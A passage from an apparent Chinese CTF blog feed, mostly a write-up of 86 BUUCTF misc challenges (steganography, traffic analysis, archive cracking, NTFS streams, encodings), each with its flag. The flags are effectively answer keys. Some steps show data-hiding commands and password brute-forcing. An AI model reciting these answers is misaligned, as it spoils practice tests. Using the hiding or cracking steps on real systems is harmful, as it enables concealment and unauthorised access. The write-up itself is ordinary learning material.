a= \[&#x27;840&#x27;, &#x27;710&#x27;, &#x27;670&#x27;, &#x27;840&#x27;, &#x27;700&#x27;, &#x27;1230&#x27;, &#x27;890&#x27;, &#x27;1110&#x27;, &#x27;1170&#x27;, &#x27;950&#x27;, &#x27;990&#x27;, &#x27;970&#x27;, &#x27;1170&#x27;, &#x27;1030&#x27;, &#x27;1040&#x27;, &#x27;1160&#x27;, &#x27;950&#x27;, &#x27;1170&#x27;, &#x27;1120&#x27;, &#x27;950&#x27;, &#x27;1190&#x27;, &#x27;1050&#x27;, &#x27;1160&#x27;, &#x27;1040&#x27;, &#x27;950&#x27;, &#x27;1160&#x27;, &#x27;1050&#x27;, &#x27;1090&#x27;, &#x27;1010&#x27;, &#x27;330&#x27;, &#x27;1250&#x27;\]s = &#x27;&#x27;for i in a:s+=chr(int(i)//10)print(s)

TGCTF{You_caught_up_with_time!}
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Misc Record</title>
    <url>/2024/11/Misc-Record/</url>
    <content><![CDATA[Misc刷题1.BUU刷题
终于刷到第七页了！
目标刷完第七页
目前进度（ 7 &#x2F; 7 ）

1.签到顾名思义，签到，复制提交就好
2.金三胖简单的拆分gif，打开puzzlesolver一把梭
3.你竟然赶我走010一把梭

4.二维码用随波逐流分析一下发现有隐藏文件，binwalk提取出一个zip，加密的打开提示我们是4number，arp爆破出密码是7639，打开txt得到flag{vjpw_wnoei}
5.大白随波逐流爆宽高即可




6.乌镇峰会种图随波逐流一把梭
7.wireshark查找password，追踪tcp流，得到password&#x3D;ffb7567a1d4f4abdffdb54e022f8facd
8.N种方法解决随波逐流梭出一张二维码，微信一扫就拿到flag
9.基础破解Arp暴力破解密码得到密码是2563，txt是base64加密，解密就行
10.文件中的秘密文件属性里有flag
11.zip伪加密随波逐流伪加密修复即可
12.LSBLsb隐写，用stegsolve打开可以发现藏了一张png，保存下来是一张二维码，扫一下就好
13.被嗅探的流量随波逐流一把梭
14.rarArp爆破得到密码8795，flag{1773c5da790bd3caff38e3decd180eb7}
15.qrCQR扫一下就行
16.镜子里的世界Zsteg一把梭
17.爱因斯坦Binwalk提取zip，要密码，在图片的属性中可以看到密码，得到flag
18.ningen图片先binwalk提取出zip，zip爆破密码得出8368，解密得到flag
19.小明的保险箱图片先binwalk提取出zip，zip爆破密码得出7869，解密得到flag
20.Easycap拖进winshark，追踪TCP流得到flag
21.隐藏的钥匙010打开，查找base，得到加密过的数据。解密一下就是flag
22.另外一个世界010打开后在文件末尾出现了一串神秘的二进制串，cherchef解密后恰好是flag
23.数据包中的线索导出对象为http时，追踪tcp流得到一串神秘的base64加密，复制进随波逐流用base64转图片就能看到flag






24.神秘龙卷风得到zip加密爆破得到密码5463，解密出的txt有多个+和.&gt;，猜测为字频统计，以.&gt;为分割，编写脚本得到flag




25.FLAG得到的图片用stegsolve打开查看lsb，得到一个压缩包，解压后没有后缀

File一下发现是elf，用kali打开即可

26.假如给我三天光明拿到png一看就知道是盲文加密，解密后是kmdonowg，即为压缩包密码，解压后得到一段摩斯密码的音频，对应解密后是flag
27.后门查杀打开跟我说有病毒。。给我隔离了。。。
选择保留在电脑上，得到一个html文件夹
这里需要使用D盾来查杀


看到


得到密码，flag：flag{6ac45fb83b3bc355c024f5034b947dd3}
28.webshell后门与上题类似。D盾扫描


在第一个文件中能看到pass，flag：flag{ba8e6c6f35a53933b871480bb9a9545c}
29.来首歌吧简单的摩斯密码，打开audacity对照频谱图手敲莫斯密码即可


（ ↑ 为一部分频谱图 ）
...../-.../-.-./----./..---/...../-..../....-/----./-.-./-.../-----/.----/---../---../..-./...../..---/./-..../.----/--.../-../--.../-----/----./..---/----./.----/----./.----/-.-./

随波逐流解密即可
30.面具下的flag得到一张知名男女图片，随波逐流一下可以发现有隐藏文件，binwalk提取一下可以发现得到一个压缩包，解压发现要密码
，可以发现zip是伪加密，修改后解压。
得到一个vmdk文件，搜了一下发现
“后缀为 .vmdk 的文件是 VMware 虚拟磁盘文件，通常用于虚拟机环境中存储虚拟机的磁盘数据。”
以为要用虚拟机的，但是打不开。于是看了一下wp
这里的flag.vmdk用010打开后搜 flag 等关键字样得到这个


这个


还有这个


直接复制好像解密不了。
打开kali，用kali自带的7z解密可以提取这些文件，输入
7z x flag.vmdk -o./

 -o后面的.&#x2F;是把压缩的内容放在当前目录下，解压完成就能看见好几个文件夹


这是brainfuck加密和Ook! Obfuscation加密
brainfuck加密随波逐流里有
Ook! Obfuscation加密网站：Ook! Obfuscation解密网站
分别解密得到flag{N7F5_AD5_i5_funny!}
31.荷兰宽带数据泄露拿到bin文件查了一下发现要用路由器解析的，用RouterPassView
打开后看了一下wp才知道username是flag




32.九连环拿到jpg用010看一下，发现后面有压缩包隐藏的
先试一下随波逐流的binwalk提取，失败了，没提出来
于是我们用kali的binwalk
![2024-11-19 002930](.&#x2F;Misc-Record&#x2F;2024-11-19 002930.png)
（不知道为什么我的binwalk要加一个–run-as&#x3D;root提升权限。。）
提取出来的一个图片和一个压缩包，猜测密码在图片的隐写里
用steghide跑一下，真的在里面，提取


查看它，下面的就是密码


直接用密码解压压缩包就能看到flag：flag{1RTo8w@&amp;4nK@z*XL}
33.认真你就输了这题我学到了ms-office文件本质是zip
MS-Office文件word、excel、ppt本质都是zip文件，就可以隐写。把01.xls重命名为01.zip，解压缩后在 xl&#x2F;charts 目录里有 flag.txt 
34.被劫持的神秘礼物拿到pcapng文件用wireshark打开，这里可以使用http.request.method&#x3D;&#x3D;POST进行过滤或者一个个点开看，发现
![2024-11-19 113909](.&#x2F;Misc-Record&#x2F;2024-11-19 113909.png)
得到账号密码adminaadminb，包上小写md5，flag{1d240aafe21a86afc11f38a45b541a49}
35.被偷走的文件提到偷走文件一般要清楚是找HTTP或者FTP，看到导出对象里有FTP-DATA，保存这个flag.rar


保存下来发现要密码解压，爆破可以发现，密码是5790，得到flag
36.藏藏藏得到一个jpg，用随波逐流的formost提取，得到一个zip，打开是个xlsx，一张二维码，用QR扫码得到flag




37.佛系青年拿到的zip拖进随波逐流看一下，发现第一个jpg无加密，第二个txt伪加密，修复一下
jpg上说我FFF佛慈悲，txt内容为


发现是与佛论禅编码，随波逐流得到flag
38.你猜我是个啥随波逐流一把梭
39.刷新过的图片关键词“刷新”，很可能是F5-steganography加密，尝试解密


我这里不知道为什么还要加上
--add-opens java.base/sun.security.provider=ALL-UNNAMED

才能F5解密。。
得到一个txt文件，打开是乱码，却能看到首两个字母PK，改后缀为zip，解压
需要密码，发现是伪加密，随波逐流修复一下得到flag：flag{96efd0a2037d06f34199e921079778ee}
40.秘密文件winshark打开，查看了一下http，ftp-data，啥也没有。。
过滤tcp流，看到提示，追踪tcp，发现隐藏了一个rar文件


用随波逐流的binwalk提取文件，得到rar，爆破密码发现是1903，得到flag：flag{d72e5a671aa50fa5f400e5d10eedeaa5}
41.鸡你太美得到的zip一个是gif，另一个是损坏的gif，010打开发现缺少文件头，补上文件头即可拿到gif


这里注意flag不是zhi-yin-you-are-beautiful，不知道为啥是下划线zhi_yin_you_are_beautiful
得到flag：flag{zhi_yin_you_are_beautiful}
42.just_a_rar得到的zip解压得到四位数.zip，直接爆破得到密码2016
拿到一张flag.jpg，拖进随波逐流得到flag
43.snake拿到zip得到一个jpg，发现有隐藏文件
binwalk提取文件得到一个zip，zip里面是cyber和key
key里面是V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo&#x3D;
base64解密得到
What is Nicki Minaj’s favorite song that refers to snakes?
搜了一下是anaconda，所以这是真正的key
而cyber是serpent加密，解密网址http://serpent.online-domain-tools.com
解密得到flag


flag：flag{who_knew_serpent_cipher_existed}
44.菜刀666放进随波逐流用formost提取出一个zip，但是要密码，而且爆破不出来
又看pcanp，过滤http.request.method&#x3D;&#x3D;POST


发现1068的传了FF D8 FF E0 00 10 4A 46 49 46 00 01 ( JPG的文件头 )
复制下来进入010新建一个文件，保存图片得到


得到密码：Th1s_1s_p4sswd_!!!
解压得到flag：flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}
45.一叶障目随波逐流一把梭




46.神奇的二维码得到一张二维码，CQR扫一下发现不是flag


拖进随波逐流binwalk提取一下文件得到716A.rar 7104.rar 17012.rar 18394.rar
1.7104.rar
解压得到encode.txt
里面是YXNkZmdoamtsMTIzNDU2Nzg5MA&#x3D;&#x3D;
base64解密一下是asdfghjkl1234567890
没用，看下一个。。
2.716A
解压得到一张 “已经可以了大佬你现在这个情况证明你已经无敌了” 的图片和一个看看flag在不在里面^_^.zip
用asdfghjkl1234567890解密zip，又得到一个 “已经可以了大佬你现在这个情况证明你已经无敌了” 的图片


没用，看下一个。。
3.17012.zip
解压得到一个flag.doc，里面是很长的字符
需要多次解码base64，网上找了个脚本
import base64def decode(f):	n = 0;	while True:		try:			f = base64.b64decode(f)			n += 1		except:			print(&#x27;[+]Base64共decode了&#123;0&#125;次，最终解码结果如下:&#x27;.format(n))			print(str(f,&#x27;utf-8&#x27;))			breakif __name__ == &#x27;__main__&#x27;:	f = open(&#x27;e:/Python 3.13/ccc.txt&#x27;,&#x27;r&#x27;).read()	decode(f)

跑一下脚本


得到如下：comEON_YOuAreSOSoS0great
下一个。。。
4.18394.rar
用comEON_YOuAreSOSoS0great去解密rar，得到一串音频，拖进aud


明显看出来是摩斯密码，手敲代码得
--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--

解密最后得到flag：flag{morseisveryveryeasy}     (要注意是小写)
ps：这道题好烦。。
47.纳尼拿到文件打不开一看就是缺少文件头，010里面补上47 49 46 38得到gif


用随波逐流分解帧间隔，得到Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0&#x3D;
base64解码得CTF{wang_bao_qiang_is_sad}，则flag：flag{wang_bao_qiang_is_sad}
48.excel破解随波逐流一把梭
49.来题中等的吧义眼顶针，鉴定为morse


.-/.-../.--./..../.-/.-../.-/-...

解密得ALPHALAB
则flag{alphalab}
50.梅花香自苦寒来拿到png先用随波逐流跑一下，得到一串坐标，猜测是画图


网上找了一下，找到了gnuplot来画图，不过我们先要把括号和逗号去掉，脚本如下
with open(&#x27;E:\meihuai.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)    re = res.read()    res.close()    with open(&#x27;E:\output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入output.txt    re = re.split()    tem = &#x27;&#x27;    for i in range(0, len(re)):        tem = re[i]        tem = tem.lstrip(&#x27;(&#x27;)        tem = tem.rstrip(&#x27;)&#x27;)        for j in range(0, len(tem)):            if tem[j] == &#x27;,&#x27;:                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]        gnup.write(tem + &#x27;\n&#x27;)    gnup.close()

去掉括号和逗号后用gnuplot画图


画完图后得到一个二维码，CQR扫一下得到flag：flag{40fc0a979f759c8892f4dc045e28b820}
51.谁赢了比赛？拿到png用binwalk提取文件得到一个zip，有密码
arp爆破得到密码是1020
解压是一张gif，逐帧分解得到很多张棋谱和一张奇怪的图片


图片stegsolve一下在Red plane0得到一张二维码
CQR扫一下


得到flag：flag{shanxiajingwu_won_the_game}
52.[ACTF新生赛2020]outguess拿到一堆东西，txt里让我们guess一下flag在哪，一看就很明显是旁边的mmm.jpg里
而且是outguess隐写
这里我们要注意的是直接去无密文outguess会显示

[!WARNING]
Extracted datalen is too long

说明是有密文的
发现吗，mmm.jpg的属性里面有：公正民主公正文明公正和谐
社会主义核心价值观解码:  abc
abc作为密文outguess.


得到flag：flag{gue33_Gu3Ss!2020}
53.[WUSTCTF2020]find_me一定一定要多看属性！
属性备注里面有盲文   ⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍&#x3D;
随波逐流解密得到flag：flag{y$0$u_f$1$n$d$_M$e$e$e$e$e}
54.穿越时空的思念得到音频听一下能在右声道发现明显的莫斯密码，手敲得
..-./-----/..---/----./-.../-../-..../..-./...../...../.----/.----/...--/----./././-.././-.../---.././....-/...../.-/.----/--.../...../-.../-----/--.../---../-..../..-./-----/..---/----./-.../-../-..../..-./.....

解密，得F029BD6F551139EEDEB8E45A175B0786F029BD6F5
取前32位小写得flag：flag{f029bd6f551139eedeb8e45a175b0786}
55.[SWPU2019]我有一只马里奥得到一个exe，执行后得到1.txt，里面写着ntfs      flag.txt
有点不会了，看了下wp
查到了

[!NOTE]
NTFS交换数据流（简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，而我们无法查看到非主文件数据流，因文件夹大小始终显示0

以下是进行文件流计生和查看的方法，以后在windows命令行下查看文件，都用 dir &#x2F;r

[!NOTE]
寄生一:
echo 写入内容&gt;&gt;宿主文件:交换数据流文件(寄生文件)
echo ever&gt;&gt;1.txt:2.txt
2.txt为echo创建出交换数据流文件，ever在2.txt中
寄生二:
type 交换数据流文件(寄生文件)&gt;&gt;宿主文件夹:交换数据流文件(寄生文件)
type 2.txt&gt;&gt;temp:2.txt
temp为空文件夹,执行后2.txt寄生在temp文件夹上
type a.jpg&gt;&gt;temp:a.jpg
temp为空文件夹,执行后a.jpg寄生在temp文件夹上
查看:
notepad 宿主文件:交换数据流文件(寄生文件）
notepad 1.txt:2.txt
查看图片文件:
mspaint 宿主文件:交换数据流文件(寄生文件)
notepad a.jpg:b.jpg
过滤
dir &#x2F;r | findstr $DATA （过滤DATA字符串）

这道题应该是利用ntfs把flag.txt隐藏了
需要我们先建立一个文件夹来存放1.txt，再cmd，然后直接查看flag.txt


运行这个notepad 1.txt:flag.txt后就能看到flag：flag{ddg_is_cute}
56.[GUET-CTF2019]KO打开文本是明显的Ook!加密
拖进在线网站直接解密就好（网站见Misc Ultra）
flag：flag{welcome to CTF}
57.[ACTF新生赛2020]base64隐写解压zip得到一个txt和hint
txt里面是多行base64加密过的，复制进随波逐流
选择“base64隐写解密”直接得到flag：flag{6aseb4_f33!}
（？？？
看了一下wp发现这题base64解密过后是一个python2脚本，需要复制进kali跑脚本出flag
没啥好说的，随波逐流太好用了。。还能顺手给你把脚本跑了。。
58.[MRCTF2020]ezmisc随波逐流爆破宽高得


flag：flag{1ts_vEryyyyyy_ez!}
59.[GXYCTF2019]gakki拿到wolaopo.jpg，发现有文件隐写
binwalk提取得到zip，有密码
arp爆破得密码是8864，拿到一个毫无规律的txt，里面如同乱码
查了一下wp
最后发现是要我们统计字符，利用puzzlesolver


flag就是频率前几个的
flag：flag{gaki_IsMyw1fe}
（脑洞好大这题）
60.[HBNIS2018]caesar全文：
题目：caesar描述：gmbhjtdbftbsflag格式：XXX 明文提交：直接提交明文 （小写）

直接凯撒解密得flagiscaesar
flag：flag{flagiscaesar}
61.[SUCTF2018]single dog拿到jpg发现后接了文本，binwalk提取一下是个zip
解压得1.txt里面是一堆颜文字，查了一下是AAencode，除此之外还有jjencode、ppencode、rrencode、uuencode、xxencode
利用随波逐流解密即可，也可以用在线网站http://www.hiencode.com/
解码得flag：flag{happy double eleven}
62.黑客帝国zip解压一下看到很长的txt，开头是52617221，是rar文件头
010存一下，得到rar，解压要密码，爆破得到3690
解压得到一个png，但是打不开，010看一下


看出来后面JFIF是jpg的，且看到010最后面是FF D9
应该是修改了文件头，改回jpg即可
(PNG（png)文件头：89 50 4E 47　文件尾：AE 42 60 82）(JPEG (jpg)文件头：FF D8 FF　　文件尾：FF D9　)
拿到图片


flag：flag{57cd4cfd4e07505b98048ca106132125}
63.[HBNIS2018]低个头全文：
题目：低个头描述：EWAZX RTY TGB IJN IO KL 请破解该密文 flag格式：XXX 明文提交：直接提交明文（大写）

脑洞题。。。查了一下wp
题目“低个头”的意思竟然是让你低头看键盘
而那些字母在键盘上组合起来组成CTF。。
所以flag：flag{CTF}
64.[SWPU2019]伟大的侦探zip是有密码的，而且爆破不出来
密码txt里面有一串乱码是密码
这里需要我们用010打开txt，而且在视图上选择EBCDIC（还不清楚为什么。。


就能得到密码：wllm_is_the_best_team!
然后就得到了很多小人的图片


这个对照表在 随波逐流&#x2F;其他工具&#x2F;更多图形密码（在线） 里面能找到


对照出来是iloveholmesandwllm
flag：flag{iloveholmesandwllm}
65.[MRCTF2020]你能看懂音符吗压缩包解压不了，010打开发现修改了文件头
改回来，解压，得到一个docx文档，里面没啥内容
将文档后缀改成zip，打开document.xml，看到


是一串音乐加密的数据
♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=

随波逐流解密得MRCTF{thEse_n0tes_ArE_am@zing~}
flag：flag{thEse_n0tes_ArE_am@zing~}
66.我吃三明治得到一张三明治图片，formost一下还是一张三明治，010打开看到


藏了
MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2

在两张图片之间（就像三明治一样。。
base32解码得flag：flag{6f1797d4080b29b64da5897780463e30}
67.[SWPU2019]你有没有好好看网课得到两个zip，第二个zip爆破密码是183792
打开得到docx和影流之主
脑洞题，查了一下wp
docx的内容是：


提示我们在视频的5.20秒和7.11秒有问题
使用potplayer逐帧查看，分别看到


和




..... ../... ./... ./... ../dXBfdXBfdXA=

第一个是敲击码，第二个是base64
解码分别得wllm和up_up_up，拼接得到wllmup_up_up
这是第一个zip的解压密码
解压出来得到一张jpg，随波逐流得到flag：flag{A2e_Y0u_Ok?}
68.[ACTF新生赛2020]NTFS数据流这里需要注意的是解压软件的选择，不能用bandizip，否则会没有ntfs
建议选择winrar
winrar解压完zip后，直接 dir &#x2F;r ，过滤 $DATA字符串
看到有隐藏后直接notepad


得到flag：flag{AAAds_nntfs_ffunn?}
69.sqltest拿到文件进winshark分析一下发现是sql注入攻击
而且是sql盲注，它是用ascii码的大小比较来判断库名、表名、字段名和字段值的内容的
打开文件如下


这里看出来是sql了，可以先过滤一下http流量
再选择 &#x2F;文件&#x2F;导出分组解析结果&#x2F;AS CSV
这样就可以把流量导出成表格。看得更清楚


一般来说，前面的内容是hacker来判断数据库名、表名、字段名的，我们直接拉到最下面
![2024-11-22 003853](.&#x2F;Misc-Record&#x2F;2024-11-22 003853.png)
可以发现红框框起来的数字不同的是不同的对flag的尝试
hacker使用二分法爆破出flag内容，在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符。
如上图是55和125
这里我们需要找到ascii开始判断flag的部分来提取，或者可以从下往上提取
最后提取如下
102, 108, 97, 103, 123, 52, 55, 101, 100, 98, 56, 51, 48, 48, 101, 100, 53, 102, 57, 98, 50, 56, 102, 99, 53, 52, 98, 48, 100, 48, 57, 101, 99, 100, 101, 102, 55, 125

ascii码解密得到flag：flag{47edb8300ed5f9b28fc54b0d09ecdef7}
70.john-in-the-middle拿到pcanp文件可以先拖到随波逐流，binwalk一下没有提取出什么东西
formost一下发现提取出了几张图片，逐个对图片进行分析。
发现有个三角形状的图片在stegsolve可以看到flag


flag：flag{J0hn_th3_Sn1ff3r}
71.[UTCTF2020]docxword本质是zip，改后缀名，在word&#x2F;media目录里找到image23.png
里面有flag


flag：flag{unz1p_3v3ryth1ng}
72.[ACTF新生赛2020]swp拿到zip先解压，拿到pcapng可以先尝试formost提取一下
提取出一堆图片，gif和一个zip
zip解压过后得到一个flag.swp
可以用010打开，发现


得到ctf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}
flag：flag{c5558bcf-26da-4f8b-b181-b61f3850b9e5}
73.[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;题目解码为Is this base?
解压zip得到一个txt，里面是多行base64，解密
解密后得到一首法语诗词，，
可以在随波逐流里选择 base64隐写解密，得到GXY{fazhazhenhaoting}
flag：flag{fazhazhenhaoting}
74.间谍启示录得到iso映像文件，foremost提取一下
发现得到了个exe和一个压缩包
exe运行得到文件已被销毁.exe
压缩包解压得到文件已被销毁.exe和文件已被销毁.ico和flag.exe
运行flag.exe，就能看到机密文件.txt（记得要在显示里面把隐藏内容勾选上）


flag：flag{379:7b758:g7dfe7f19:9464f:4g9231}
75.喵喵喵得到一张小猫图片，在stegsolve里面发现在RGB三色的0通道有异常，猜测是lsb隐写
顺序是BGR时得到


是一张png，保存下来，却发现打不开
010查看发现文件头有问题，我们修改一下
查看后发现是半张二维码


二维码拖进随波逐流爆破宽高得到整张二维码
扫了之后发现给了一个网盘地址


网盘https://pan.baidu.com/s/1pLT2J4f
得到一个txt文件，写着：flag不在这里哦  你猜猜flag在哪里呢？  找找看吧
猜测为ntfs，扫描，提取


得到一个pyc

[!NOTE]
.pyc 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行
想查看 .pyc 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 .py 文件。

使用uncompyle6进行反编译。或者使用在线网站 https://tool.lu/pyc/
这个我使用在线网站，因为不知道为什么我的uncompyle6反编译出来的有点问题，也许是反编译的版本是3.12.7和2.7不同的问题。。
得到如下代码：
#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 2.7import base64def encode():    flag = &quot;*************&quot;    ciphertext = []    for i in range(len(flag)):        s = chr(i ^ ord(flag[i]))        if i % 2 == 0:            s = ord(s) + 10        else:            s = ord(s) - 10        ciphertext.append(str(s))    return ciphertext[::-1]ciphertext = [    &quot;96&quot;,    &quot;65&quot;,    &quot;93&quot;,    &quot;123&quot;,    &quot;91&quot;,    &quot;97&quot;,    &quot;22&quot;,    &quot;93&quot;,    &quot;70&quot;,    &quot;102&quot;,    &quot;94&quot;,    &quot;132&quot;,    &quot;46&quot;,    &quot;112&quot;,    &quot;64&quot;,    &quot;97&quot;,    &quot;88&quot;,    &quot;80&quot;,    &quot;82&quot;,    &quot;137&quot;,    &quot;90&quot;,    &quot;109&quot;,    &quot;99&quot;,    &quot;112&quot;,]

这里看到对flag进行了加密，我们解密一下，解密脚本：
def decode(ciphertext):    # 将密文恢复到加密前的顺序    ciphertext = list(map(int, ciphertext[::-1]))    flag = []        for i, s in enumerate(ciphertext):        if i % 2 == 0:            s -= 10        else:            s += 10        # 进行异或操作还原原始字符        flag.append(chr(s ^ i))        return &quot;&quot;.join(flag)ciphertext = [    &quot;96&quot;,    &quot;65&quot;,    &quot;93&quot;,    &quot;123&quot;,    &quot;91&quot;,    &quot;97&quot;,    &quot;22&quot;,    &quot;93&quot;,    &quot;70&quot;,    &quot;102&quot;,    &quot;94&quot;,    &quot;132&quot;,    &quot;46&quot;,    &quot;112&quot;,    &quot;64&quot;,    &quot;97&quot;,    &quot;88&quot;,    &quot;80&quot;,    &quot;82&quot;,    &quot;137&quot;,    &quot;90&quot;,    &quot;109&quot;,    &quot;99&quot;,    &quot;112&quot;,]# 解码密文flag = decode(ciphertext)print(&quot;Decoded flag:&quot;, flag)

解密出flag：flag{Y@e_Cl3veR_C1Ever!}
76.小易的u盘拿到iso我们可以foremost提取一下或者解压一下
拿到一大推文件，先看inf
inf里面是
[AutoRun]Open=autoflag - 副本 (32)


[!NOTE]
inf文件中包含硬件设备的信息或脚本以控制硬件操作，inf是微软为硬件设备制造商发布其驱动程序推出的一种文件格式。inf文件中包含了硬件驱动安装的信息，比如、安装到哪一个文件夹中、怎样在注册表中加入自身相关信息、源文件在哪里等
autorun.inf 里面 Open的含义含义：指定设备启用时运行之命令行。格式：Open&#x3D;命令行（命令行：程序路径名 [参数])参数：命令行：自动运行的命令行，必须是 .exe、.com、.bat 文件，其他格式文件可以使用start.exe打开或使用ShellExecute命令。

说明它自动运行autoflag-副本（32）
我们尝试运行的时候会报错，使用ida反编译试试
发现flag


flag：flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}
77.[WUSTCTF2020]爬附件没有后缀，010打开发现是pdf文件，改后缀后打开


提示我们flag被图片盖住了，使用在线编辑pdf网站： https://smallpdf.com/
移开图片看到：


Hex解密得：wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}
flag：flag{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}
78.[RoarCTF2019]黄金6年下载是一个MP4文件，010打开发现结尾有


是base64，解码发现有rar字样，猜测为压缩包，使用cyberchef


先base64解码再hex加密就能得到rar的十六进制，使用010保存下来，得到rar，解压需要密码
使用potplayer逐帧查看视频，发现几个二维码








（服了，考察眼力。。
解码之后分别是 key1:i key2:want key3:play key4:ctf
连起来就是压缩包密码，iwantplayctf，得到roarctf{CTF-from-RuMen-to-RuYuan}
flag：flag{CTF-from-RuMen-to-RuYuan}
79.[WUSTCTF2020]alison_likes_jojo得到两张图片。boki.jpg和jljy.jpg
先处理boki，发现有隐写，binwalk提取一下
得到一个zip，有密码，爆破得到密码是888866，解压得到
WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09
经过三次base64解码得到killerqueen
再处理jljy.jpg，最后发现是outguess隐写


成功提取，得到 wctf2020{pretty_girl_alison_likes_jojo}
flag：flag{pretty_girl_alison_likes_jojo}
80.[安洵杯 2019]吹着贝斯扫二维码得到一个flag.zip和一堆东西，zip用winrar打开发现有注释
GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY

这个先解不出来，尝试别的
010随便打开一个文件可以发现是jpg文件，后缀改为jpg后就可以打开
这里可以cmd打开后 ren * *.jpg 批量改后缀（网上学的


发现这里应该是二维码拼接，而且010随便拖进去一个jpg发现在最后有神秘数字
猜测为拼接顺序，根据数字重命名文件
初见端倪：


试着扫了一下，果然扫不出来，要用ps拼接，，或者使用PPT拼接，我这里使用ppt
拼接完如下：
（累死lz了。。）


扫码，扫出来得到
BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32

回想注释里得到的神秘数字，我们利用base家族反向解密，其中13指的是rot13
得到：ThisIsSecret!233 为解压缩密码
解压zip，得到flag{Qr_Is_MeAn1nGfuL}
flag：flag{Qr_Is_MeAn1nGfuL}
81.从娃娃抓起全文：
题目描述：伟人的一句话，标志着一个时代的开始。那句熟悉的话，改变了许多人的一生，为中国三十年来计算机产业发展铺垫了道路。两种不同的汉字编码分别代表了汉字信息化道路上的两座伟大里程碑。请将你得到的话转为md5提交，md5统一为32位小写。0086 1562 2535 5174bnhn s wwy vffg vffg rrhy fhnv请将你得到的这句话转为md5提交，md5统一为32位小写。提交格式：flag&#123;md5&#125;

两行加密的，提醒我们都是汉字编码，随波逐流解密试试
第一行经过中文电报解码得到：
人工智能
第二行经过五笔字型解码，得到：
也要从娃娃抓起
解密网址： http://life.chacuo.net/convertwubi（这个是五笔输入的网址，需要你一个个打出来）
总的：人工智能也要从娃娃抓起
包上md5得到：3b4b5dccd2c008fe7e2664bd1bc19292
flag：flag{3b4b5dccd2c008fe7e2664bd1bc19292}
82.弱口令ZIP是加密的，看备注里面是一堆空白


出不来，查了一下发现要用sunblime，打开发现


貌似是莫斯密码，手敲得到
.... . .-.. .-.. ----- ..-. --- .-. ..- --

解码得到：HELL0FORUM
解压zip，得到女神.png
看了wp才知道有个cloacked-pixel隐写
装好cloacked-pixel后kali解密得到flag


得到flag：flag{jsy09-wytg5-wius8}
83.Mysterious得到一个exe，一看就是反编译题目，使用ida打开
先f5看函数，步入winmain，再步入dialogfunc，之后步入sub_401090
看到flag


flag：flag{123_Buff3r_0v3rf|0w}
84.[GUET-CTF2019]zips得到zip解压得到222.zip
爆破得到密码723456
然后得到一个111.zip
111.zip可以发现是伪加密，破解后得到flag.zip和一个sh
setup.sh里面的内容是
#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&#x27;time&#x27;).time())&quot;` flag.zip flag

发现zip是将时间戳当作密码
于是我们使用掩码爆破
发现flag.zip创建时间2019-05-17 08:25:28
先用py跑出临近一个小时的时间戳


得到时间戳区间
1558051200.01558054800.0

而且因为小数点后不确定，可以从第一位进行尝试
接下来使用arp进行掩码爆破


爆破出密码1558080832.15
解压得到flag：flag{fkjabPqnLawhvuikfhgzyffj}
85.[UTCTF2020]file header顾名思义是考文件头的，我们打开后是一张图片，发现打不开，于是拖进010发现少了png的文件头，补上。
然后就能拿到flag：flag{3lit3_h4ck3r}
86.zip拿到了很多的zip，但是每个zip文件内容都很短，意思是要我们爆破crc
网上找了个脚本
import zipfileimport stringimport binasciistring=string.printablecrc_s=&#x27;&#x27;for i in range(0,68):    zip_name= &quot;out&quot; + str(i) + &quot;.zip&quot;    #读每个文件    zip_crc=zipfile.ZipFile(zip_name,&#x27;r&#x27;).getinfo(&#x27;data.txt&#x27;).CRC    #读crc    print(zip_crc)    for a in string:        for b in string:            for c in string:                for d in string:                    s=a+b+c+d                    #进行爆破                    if zip_crc == (binascii.crc32(s.encode())):                        print(s)                        crc_s+=sprint(crc_s)

最后爆破出来得到
